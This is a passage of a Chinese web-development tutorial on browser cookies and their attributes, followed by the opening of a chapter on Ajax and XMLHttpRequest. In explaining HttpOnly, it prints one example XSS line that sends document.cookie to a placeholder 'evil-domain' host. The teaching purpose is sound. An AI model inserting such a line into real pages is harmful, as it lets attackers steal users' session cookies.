的使用</li><li>理解 Session 的使用</li></ul><h4 id="概述-1"><a href="#概述-1" class="headerlink" title="概述"></a>概述</h4><p>Cookie 是服务器保存在浏览器的一小段文本信息，每个 Cookie 的大小一般不能超过4KB。浏览器每次向服务器发出请求，就会自动附上这段信息。</p><p>Cookie 主要用来分辨两个请求是否来自同一个浏览器，以及用来保存一些状态信息。它的常用场合有以下一些。</p><ul><li>对话（session）管理：保存登录、购物车等需要记录的信息。</li><li>个性化：保存用户的偏好，比如网页的字体大小、背景色等等。</li><li>追踪：记录和分析用户行为。</li></ul><p>有些开发者使用 Cookie 作为客户端储存。这样做虽然可行，但是并不推荐，因为 Cookie 的设计目标并不是这个，它的容量很小（4KB），缺乏数据操作接口，而且会影响性能。客户端储存应该使用 Web storage API 和 IndexedDB。</p><p>Cookie 包含以下几方面的信息。</p><ul><li>Cookie 的名字</li><li>Cookie 的值（真正的数据写在这里面）</li><li>到期时间</li><li>所属域名（默认是当前域名）</li><li>生效的路径（默认是当前网址）</li></ul><p>举例来说，用户访问网址<code>www.example.com</code>，服务器在浏览器写入一个 Cookie。这个 Cookie 就会包含<code>www.example.com</code>这个域名，以及根路径<code>/</code>。这意味着，这个 Cookie 对该域名的根路径和它的所有子路径都有效。如果路径设为<code>/forums</code>，那么这个 Cookie 只有在访问<code>www.example.com/forums</code>及其子路径时才有效。以后，浏览器一旦访问这个路径，浏览器就会附上这段 Cookie 发送给服务器。</p><p>浏览器可以设置不接受 Cookie，也可以设置不向服务器发送 Cookie。<code>window.navigator.cookieEnabled</code>属性返回一个布尔值，表示浏览器是否打开 Cookie 功能。</p><pre><code>// 浏览器是否打开 Cookie 功能window.navigator.cookieEnabled // true</code></pre><p><code>document.cookie</code>属性返回当前网页的 Cookie。</p><pre><code>// 当前网页的 Cookiedocument.cookie</code></pre><p>不同浏览器对 Cookie 数量和大小的限制，是不一样的。一般来说，单个域名设置的 Cookie 不应超过30个，每个 Cookie 的大小不能超过4KB。超过限制以后，Cookie 将被忽略，不会被设置。</p><p>浏览器的同源政策规定，两个网址只要域名相同和端口相同，就可以共享 Cookie（参见《同源政策》一章）。注意，这里不要求协议相同。也就是说，<code>http://example.com</code>设置的 Cookie，可以被<code>https://example.com</code>读取。</p><h4 id="Cookie-与-HTTP-协议"><a href="#Cookie-与-HTTP-协议" class="headerlink" title="Cookie 与 HTTP 协议"></a>Cookie 与 HTTP 协议</h4><p>Cookie 由 HTTP 协议生成，也主要是供 HTTP 协议使用。</p><h6 id="HTTP-回应：Cookie-的生成"><a href="#HTTP-回应：Cookie-的生成" class="headerlink" title="HTTP 回应：Cookie 的生成"></a>HTTP 回应：Cookie 的生成</h6><p>服务器如果希望在浏览器保存 Cookie，就要在 HTTP 回应的头信息里面，放置一个<code>Set-Cookie</code>字段。</p><pre><code>Set-Cookie:foo=bar</code></pre><p>上面代码会在浏览器保存一个名为<code>foo</code>的 Cookie，它的值为<code>bar</code>。</p><p>HTTP 回应可以包含多个<code>Set-Cookie</code>字段，即在浏览器生成多个 Cookie。下面是一个例子。</p><pre><code>HTTP/1.0 200 OKContent-type: text/htmlSet-Cookie: yummy_cookie=chocoSet-Cookie: tasty_cookie=strawberry[page content]</code></pre><p>除了 Cookie 的值，<code>Set-Cookie</code>字段还可以附加 Cookie 的属性。</p><pre><code>Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; Expires=&lt;date&gt;Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; Max-Age=&lt;non-zero-digit&gt;Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; Domain=&lt;domain-value&gt;Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; Path=&lt;path-value&gt;Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; SecureSet-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; HttpOnly</code></pre><p>上面的几个属性的含义，将在后文解释。</p><p>一个<code>Set-Cookie</code>字段里面，可以同时包括多个属性，没有次序的要求。</p><pre><code>Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; Domain=&lt;domain-value&gt;; Secure; HttpOnly</code></pre><p>下面是一个例子。</p><pre><code>Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly</code></pre><p>如果服务器想改变一个早先设置的 Cookie，必须同时满足四个条件：Cookie 的<code>key</code>、<code>domain</code>、<code>path</code>和<code>secure</code>都匹配。举例来说，如果原始的 Cookie 是用如下的<code>Set-Cookie</code>设置的。</p><pre><code>Set-Cookie: key1=value1; domain=example.com; path=/blog</code></pre><p>改变上面这个 Cookie 的值，就必须使用同样的<code>Set-Cookie</code>。</p><pre><code>Set-Cookie: key1=value2; domain=example.com; path=/blog</code></pre><p>只要有一个属性不同，就会生成一个全新的 Cookie，而不是替换掉原来那个 Cookie。</p><pre><code>Set-Cookie: key1=value2; domain=example.com; path=/</code></pre><p>上面的命令设置了一个全新的同名 Cookie，但是<code>path</code>属性不一样。下一次访问<code>example.com/blog</code>的时候，浏览器将向服务器发送两个同名的 Cookie。</p><pre><code>Cookie: key1=value1; key1=value2</code></pre><p>上面代码的两个 Cookie 是同名的，匹配越精确的 Cookie 排在越前面。</p><h6 id="HTTP-请求：Cookie-的发送"><a href="#HTTP-请求：Cookie-的发送" class="headerlink" title="HTTP 请求：Cookie 的发送"></a>HTTP 请求：Cookie 的发送</h6><p>浏览器向服务器发送 HTTP 请求时，每个请求都会带上相应的 Cookie。也就是说，把服务器早前保存在浏览器的这段信息，再发回服务器。这时要使用 HTTP 头信息的<code>Cookie</code>字段。</p><pre><code>Cookie: foo=bar</code></pre><p>上面代码会向服务器发送名为<code>foo</code>的 Cookie，值为<code>bar</code>。</p><p><code>Cookie</code>字段可以包含多个 Cookie，使用分号（<code>;</code>）分隔。</p><pre><code>Cookie: name=value; name2=value2; name3=value3</code></pre><p>下面是一个例子。</p><pre><code>GET /sample_page.html HTTP/1.1Host: www.example.orgCookie: yummy_cookie=choco; tasty_cookie=strawberry</code></pre><p>服务器收到浏览器发来的 Cookie 时，有两点是无法知道的。</p><ul><li>Cookie 的各种属性，比如何时过期。</li><li>哪个域名设置的 Cookie，到底是一级域名设的，还是某一个二级域名设的。</li></ul><h4 id="Cookie-的属性"><a href="#Cookie-的属性" class="headerlink" title="Cookie 的属性"></a>Cookie 的属性</h4><h6 id="Expires，Max-Age"><a href="#Expires，Max-Age" class="headerlink" title="Expires，Max-Age"></a>Expires，Max-Age</h6><p><code>Expires</code>属性指定一个具体的到期时间，到了指定时间以后，浏览器就不再保留这个 Cookie。它的值是 UTC 格式，可以使用<code>Date.prototype.toUTCString()</code>进行格式转换。</p><pre><code>Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;</code></pre><p>如果不设置该属性，或者设为<code>null</code>，Cookie 只在当前会话（session）有效，浏览器窗口一旦关闭，当前 Session 结束，该 Cookie 就会被删除。另外，浏览器根据本地时间，决定 Cookie 是否过期，由于本地时间是不精确的，所以没有办法保证 Cookie 一定会在服务器指定的时间过期。</p><p><code>Max-Age</code>属性指定从现在开始 Cookie 存在的秒数，比如<code>60 * 60 * 24 * 365</code>（即一年）。过了这个时间以后，浏览器就不再保留这个 Cookie。</p><p>如果同时指定了<code>Expires</code>和<code>Max-Age</code>，那么<code>Max-Age</code>的值将优先生效。</p><p>如果<code>Set-Cookie</code>字段没有指定<code>Expires</code>或<code>Max-Age</code>属性，那么这个 Cookie 就是 Session Cookie，即它只在本次对话存在，一旦用户关闭浏览器，浏览器就不会再保留这个 Cookie。</p><h6 id="Domain，Path"><a href="#Domain，Path" class="headerlink" title="Domain，Path"></a>Domain，Path</h6><p><code>Domain</code>属性指定浏览器发出 HTTP 请求时，哪些域名要附带这个 Cookie。如果没有指定该属性，浏览器会默认将其设为当前域名，这时子域名将不会附带这个 Cookie。比如，<code>example.com</code>不设置 Cookie 的<code>domain</code>属性，那么<code>sub.example.com</code>将不会附带这个 Cookie。如果指定了<code>domain</code>属性，那么子域名也会附带这个 Cookie。如果服务器指定的域名不属于当前域名，浏览器会拒绝这个 Cookie。</p><p><code>Path</code>属性指定浏览器发出 HTTP 请求时，哪些路径要附带这个 Cookie。只要浏览器发现，<code>Path</code>属性是 HTTP 请求路径的开头一部分，就会在头信息里面带上这个 Cookie。比如，<code>PATH</code>属性是<code>/</code>，那么请求<code>/docs</code>路径也会包含该 Cookie。当然，前提是域名必须一致。</p><h6 id="Secure，HttpOnly"><a href="#Secure，HttpOnly" class="headerlink" title="Secure，HttpOnly"></a>Secure，HttpOnly</h6><p><code>Secure</code>属性指定浏览器只有在加密协议 HTTPS 下，才能将这个 Cookie 发送到服务器。另一方面，如果当前协议是 HTTP，浏览器会自动忽略服务器发来的<code>Secure</code>属性。该属性只是一个开关，不需要指定值。如果通信是 HTTPS 协议，该开关自动打开。</p><p><code>HttpOnly</code>属性指定该 Cookie 无法通过 JavaScript 脚本拿到，主要是<code>document.cookie</code>属性、<code>XMLHttpRequest</code>对象和 Request API 都拿不到该属性。这样就防止了该 Cookie 被脚本读到，只有浏览器发出 HTTP 请求时，才会带上该 Cookie。</p><pre><code>(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;</code></pre><p>上面是跨站点载入的一个恶意脚本的代码，能够将当前网页的 Cookie 发往第三方服务器。如果设置了一个 Cookie 的<code>HttpOnly</code>属性，上面代码就不会读到该 Cookie。</p><h4 id="在浏览器中操作-Cookie"><a href="#在浏览器中操作-Cookie" class="headerlink" title="在浏览器中操作 Cookie"></a>在浏览器中操作 Cookie</h4><h6 id="document-cookie"><a href="#document-cookie" class="headerlink" title="document.cookie"></a>document.cookie</h6><p><code>document.cookie</code>属性用于读写当前网页的 Cookie。</p><p>读取的时候，它会返回当前网页的所有 Cookie，前提是该 Cookie 不能有<code>HTTPOnly</code>属性。</p><pre><code>document.cookie // "foo=bar;baz=bar"</code></pre><p>上面代码从<code>document.cookie</code>一次性读出两个 Cookie，它们之间使用分号分隔。必须手动还原，才能取出每一个 Cookie 的值。</p><pre><code>var cookies = document.cookie.split(';');for (var i = 0; i &lt; cookies.length; i++) {  console.log(cookies[i]);}// foo=bar// baz=bar</code></pre><p><code>document.cookie</code>属性是可写的，可以通过它为当前网站添加 Cookie。</p><pre><code>document.cookie = 'fontSize=14';</code></pre><p>写入的时候，Cookie 的值必须写成<code>key=value</code>的形式。注意，等号两边不能有空格。另外，写入 Cookie 的时候，必须对分号、逗号和空格进行转义（它们都不允许作为 Cookie 的值），这可以用<code>encodeURIComponent</code>方法达到。</p><p>但是，<code>document.cookie</code>一次只能写入一个 Cookie，而且写入并不是覆盖，而是添加。</p><pre><code>document.cookie = 'test1=hello';document.cookie = 'test2=world';document.cookie// test1=hello;test2=world</code></pre><p><code>document.cookie</code>读写行为的差异（一次可以读出全部 Cookie，但是只能写入一个 Cookie），与 HTTP 协议的 Cookie 通信格式有关。浏览器向服务器发送 Cookie 的时候，<code>Cookie</code>字段是使用一行将所有 Cookie 全部发送；服务器向浏览器设置 Cookie 的时候，<code>Set-Cookie</code>字段是一行设置一个 Cookie。</p><p>写入 Cookie 的时候，可以一起写入 Cookie 的属性。</p><pre><code>document.cookie = "foo=bar; expires=Fri, 31 Dec 2020 23:59:59 GMT";</code></pre><p>上面代码中，写入 Cookie 的时候，同时设置了<code>expires</code>属性。属性值的等号两边，也是不能有空格的。</p><p>各个属性的写入注意点如下。</p><ul><li><code>path</code>属性必须为绝对路径，默认为当前路径。</li><li><code>domain</code>属性值必须是当前发送 Cookie 的域名的一部分。比如，当前域名是<code>example.com</code>，就不能将其设为<code>foo.com</code>。该属性默认为当前的一级域名（不含二级域名）。</li><li><code>max-age</code>属性的值为秒数。</li><li><code>expires</code>属性的值为 UTC 格式，可以使用<code>Date.prototype.toUTCString()</code>进行日期格式转换。</li></ul><p><code>document.cookie</code>写入 Cookie 的例子如下。</p><pre><code>document.cookie = 'fontSize=14; '  + 'expires=' + someDate.toGMTString() + '; '  + 'path=/subdirectory; '  + 'domain=*.example.com';</code></pre><p>Cookie 的属性一旦设置完成，就没有办法读取这些属性的值。</p><p>删除一个现存 Cookie 的唯一方法，是设置它的<code>expires</code>属性为一个过去的日期。</p><pre><code>document.cookie = 'fontSize=;expires=Thu, 01-Jan-1970 00:00:01 GMT';</code></pre><p>上面代码中，名为<code>fontSize</code>的 Cookie 的值为空，过期时间设为1970年1月1月零点，就等同于删除了这个 Cookie。</p><h6 id="js-cookie"><a href="#js-cookie" class="headerlink" title="js-cookie"></a>js-cookie</h6><blockquote><p><a href="https://github.com/js-cookie/js-cookie" target="_blank" rel="noopener">https://github.com/js-cookie/js-cookie</a></p></blockquote><h4 id="在-Node-中操作-Cookie"><a href="#在-Node-中操作-Cookie" class="headerlink" title="在 Node 中操作 Cookie"></a>在 Node 中操作 Cookie</h4><h4 id="Session"><a href="#Session" class="headerlink" title="Session"></a>Session</h4><h4 id="Cookie-和-Session-的区别"><a href="#Cookie-和-Session-的区别" class="headerlink" title="Cookie 和 Session 的区别"></a>Cookie 和 Session 的区别</h4><h4 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h4><ul><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies</a></li></ul><h2 id="第12章-Ajax"><a href="#第12章-Ajax" class="headerlink" title="第12章 Ajax"></a>第12章 Ajax</h2><ul><li>XHR</li><li>封装 XHR<ul><li>回调函数</li><li>兼容性问题</li></ul></li><li>jQuery 的快捷方法</li><li>axios</li><li>跨域<ul><li>JSONP</li><li>CORS</li></ul></li><li>XHR 2.0<ul><li>FormData</li><li>文件上传</li></ul></li><li>客户端模板引擎</li></ul><p>案例</p><ul><li>增删改查</li></ul><h4 id="学习目标"><a href="#学习目标" class="headerlink" title="学习目标"></a>学习目标</h4><ul><li><p>Ajax</p><ul><li>能够概述什么是Ajax</li><li>能够理解传统模式交互和Ajax模式交互的异同</li></ul></li><li><p>原生 XHR</p><ul><li>能够掌握使用原生 XHR 发起 GET 请求</li><li>能够掌握使用原生 XHR 发起 POST 请求</li><li>能够理解 GET 请求与 POST 请求的区别</li><li>能够理解同步请求和异步请求的差异</li><li>能够理解什么是 GET 缓存</li><li>能够掌握让 GET 缓存失效的解决方法</li></ul></li><li><p>JSON</p><ul><li>能够理解并概述什么是 JSON</li><li>能够掌握将 JSON 格式字符串转换为 JavaScript 对象</li><li>能够掌握将 JavaScript 对象转换为 JSON 格式字符串</li></ul></li><li><p>客户端模板引擎</p><ul><li>能够理解模板引擎的本质作用</li><li>能够理解模板引擎的实现原理</li><li>能够掌握使用模板引擎将请求响应数据渲染到页面中</li></ul></li><li><p>封装 Ajax</p><ul><li>能够掌握 GET 请求方法的封装</li><li>能够掌握 POST 请求方法的封装</li><li>能够掌握 GET+POST 请求方法的封装</li><li>能够理解在异步操作中回调函数的意义</li></ul></li><li><p>jQuery 中的 Ajax</p><ul><li>能够掌握 $.ajax 的使用</li><li>能够掌握 $.get 的使用</li><li>能够掌握 $.post 的使用</li></ul></li><li><p>XHR 2.0</p><ul><li>能够掌握 FormData 对象的使用</li><li>能够掌握使用 XHR 2.0 异步上传文件</li><li>能够掌握使用 XHR 2.0 实现文件上传进度条</li></ul></li><li><p>跨域</p><ul><li>能够理解什么是 Ajax 跨域</li><li>能够理解什么是同源策略</li><li>能够掌握使用 CORS 的方式进行跨域操作</li><li>能够掌握使用 JSONP 的方式进行跨域操作</li><li>能够理解 JSONP 跨域操作原理</li><li>能够掌握 jQuery 中的 ajax 通过 JSONP 进行跨域操作</li></ul></li></ul><h4 id="概述-2"><a href="#概述-2" class="headerlink" title="概述"></a>概述</h4><blockquote><p>Web 程序最初的目的就是将信息（数据）放到公共的服务器，让所有网络用户都可以通过浏览器访问。</p></blockquote><p><img src="/images/browser-server.png" alt="browser-server"></p><p>在此之前，我们可以通过以下几种方式让浏览器发出对服务端的请求，获得服务端的数据：</p><ul><li>地址栏输入地址，回车，刷新</li><li>特定元素的 href 或 src 属性</li><li>表单提交</li></ul><p>这些方案都是我们无法通过或者很难通过代码的方式进行编程，<strong>如果我们可以通过 JavaScript 直接发送网络请求，那么 Web 的可能就会更多，随之能够实现的功能也会更多，至少不再是“单机游戏”。</strong></p><p>AJAX（Asynchronous JavaScript and XML），最早出现在 2005 年的 <a href="http://google-suggest.tumblr.com/" target="_blank" rel="noopener">Google Suggest</a>，是在浏览器端进行网络编程（发送请求、接收响应）的技术方案，它使我们可以通过 JavaScript 直接获取服务端最新的内容而不必重新加载页面。让 Web 更能接近桌面应用的用户体验。</p><p>说白了，<strong>AJAX 就是浏览器提供的一套 API，可以通过 JavaScript 调用，从而实现通过代码控制请求与响应。实现网络编程。</strong></p><blockquote><p>能力不够 API 凑。</p></blockquote><h4 id="快速上手"><a href="#快速上手" class="headerlink" title="快速上手"></a>快速上手</h4><p>使用 AJAX 的过程可以类比平常我们访问网页过程</p><pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">// 1. 创建一个 XMLHttpRequest 类型的对象 —— 相当于打开了一个浏览器</span><span class="token keyword">var</span> xhr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 2. 打开与一个网址之间的连接 —— 相当于在地址栏输入访问地址</span>xhr<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'./time.php'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 3. 通过连接发送一次请求 —— 相当于回车或者点击访问发送请求</span>xhr<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 4. 指定 xhr 状态变化事件处理函数 —— 相当于处理网页呈现后的操作</span>xhr<span class="token punctuation">.</span>onreadystatechange <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// 通过 xhr 的 readyState 判断此次请求的响应是否接收完成</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>readyState <span class="token operator">===</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 通过 xhr 的 responseText 获取到响应的响应体™</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h6 id="readyState"><a href="#readyState" class="headerlink" title="readyState"></a>readyState</h6><p>由于 <code>readystatechange</code> 事件是在 <code>xhr</code> 对象状态变化时触发（不单是在得到响应时），也就意味着这个事件会被触发多次，所以我们有必要了解每一个状态值代表的含义：</p><table><thead><tr><th>readyState</th><th>状态描述</th><th>说明</th></tr></thead><tbody><tr><td>0</td><td>UNSENT</td><td>代理（XHR）被创建，但尚未调用 <code>open()</code> 方法。</td></tr><tr><td>1</td><td>OPENED</td><td><code>open()</code> 方法已经被调用，建立了连接。</td></tr><tr><td>2</td><td>HEADERS_RECEIVED</td><td><code>send()</code> 方法已经被调用，并且已经可以获取状态行和响应头。</td></tr><tr><td>3</td><td>LOADING</td><td>响应体下载中， <code>responseText</code> 属性可能已经包含部分数据。</td></tr><tr><td>4</td><td>DONE</td><td>响应体下载完成，可以直接使用 <code>responseText</code>。</td></tr></tbody></table><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> xhr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 代理（XHR）被创建，但尚未调用 open() 方法。</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>xhr<span class="token punctuation">.</span>readyState<span class="token punctuation">)</span><span class="token comment" spellcheck="true">// => 0</span>xhr<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'./time.php'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// open() 方法已经被调用，建立了连接。</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>xhr<span class="token punctuation">.</span>readyState<span class="token punctuation">)</span><span class="token comment" spellcheck="true">// => 1</span>xhr<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span>xhr<span class="token punctuation">.</span>onreadystatechange <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>readyState<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">// send() 方法已经被调用，并且已经可以获取状态行和响应头。</span>  <span class="token comment" spellcheck="true">// => 2</span>  <span class="token comment" spellcheck="true">// 响应体下载中， responseText 属性可能已经包含部分数据。</span>  <span class="token comment" spellcheck="true">// => 3</span>  <span class="token comment" spellcheck="true">// 响应体下载完成，可以直接使用 responseText。</span>  <span class="token comment" spellcheck="true">// => 4</span><span class="token punctuation">}</span></code></pre><p>通过理解每一个状态值的含义得出一个结论：一般我们都是在 <code>readyState</code> 值为 <code>4</code> 时，执行响应的后续逻辑。</p><pre class=" language-javascript"><code class="language-javascript">xhr<span class="token punctuation">.</span>onreadystatechange <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>readyState <span class="token operator">===</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 后续逻辑......</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h6 id="遵循-HTTP"><a href="#遵循-HTTP" class="headerlink" title="遵循 HTTP"></a>遵循 HTTP</h6><p>本质上 XMLHttpRequest 就是 JavaScript 在 Web 平台中发送 HTTP 请求的手段，所以我们发送出去的请求任然是 HTTP 请求，同样符合 HTTP 约定的格式：</p><pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">// 设置请求报文的请求行</span>xhr<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'./time.php'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 设置请求头</span>xhr<span class="token punctuation">.</span><span class="token function">setRequestHeader</span><span class="token punctuation">(</span><span class="token string">'Accept'</span><span class="token punctuation">,</span> <span class="token string">'text/plain'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 设置请求体</span>xhr<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span>xhr<span class="token punctuation">.</span>onreadystatechange <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>readyState <span class="token operator">===</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 获取响应状态码</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>status<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">// 获取响应状态描述</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>statusText<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">// 获取响应头信息</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getResponseHeader</span><span class="token punctuation">(</span><span class="token string">'Content-Type'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// 指定响应头</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getAllResponseHeader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// 全部响应头</span>    <span class="token comment" spellcheck="true">// 获取响应体</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>responseText<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// 文本形式</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>responseXML<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// XML 形式，了解即可不用了</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><blockquote><p>参考链接：</p><ul><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest</a></li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest/Using_XMLHttpRequest" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest/Using_XMLHttpRequest</a></li></ul></blockquote><h4 id="具体用法"><a href="#具体用法" class="headerlink" title="具体用法"></a>具体用法</h4><h6 id="GET-请求"><a href="#GET-请求" class="headerlink" title="GET 请求"></a>GET 请求</h6><blockquote><p>通常在一次 GET 请求过程中，参数传递都是通过 URL 地址中的 <code>?</code> 参数传递。</p></blockquote><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> xhr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// GET 请求传递参数通常使用的是问号传参</span><span class="token comment" spellcheck="true">// 这里可以在请求地址后面加上参数，从而传递数据到服务端</span>xhr<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'./delete.php?id=1'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 一般在 GET 请求时无需设置响应体，可以传 null 或者干脆不传</span>xhr<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span>xhr<span class="token punctuation">.</span>onreadystatechange <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>readyState <span class="token operator">===</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>responseText<span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 一般情况下 URL 传递的都是参数性质的数据，而 POST 一般都是业务数据</span></code></pre><h6 id="POST-请求"><a href="#POST-请求" class="headerlink" title="POST 请求"></a>POST 请求</h6><blockquote><p>POST 请求过程中，都是采用请求体承载需要提交的数据。</p></blockquote><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> xhr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// open 方法的第一个参数的作用就是设置请求的 method</span>xhr<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'POST'</span><span class="token punctuation">,</span> <span class="token string">'./add.php'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 设置请求头中的 Content-Type 为 application/x-www-form-urlencoded</span><span class="token comment" spellcheck="true">// 标识此次请求的请求体格式为 urlencoded 以便于服务端接收数据</span>xhr<span class="token punctuation">.</span><span class="token function">setRequestHeader</span><span class="token punctuation">(</span><span class="token string">'Content-Type'</span><span class="token punctuation">,</span> <span class="token string">'application/x-www-form-urlencoded'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">// 需要提交到服务端的数据可以通过 send 方法的参数传递</span><span class="token comment" spellcheck="true">// 格式：key1=value1&amp;key2=value2</span>xhr<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'key1=value1&amp;key2=value2'</span><span class="token punctuation">)</span>xhr<span class="token punctuation">.</span>onreadystatechange <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>readyState <span class="token operator">===</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>responseText<span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h6 id="同步与异步"><a href="#同步与异步" 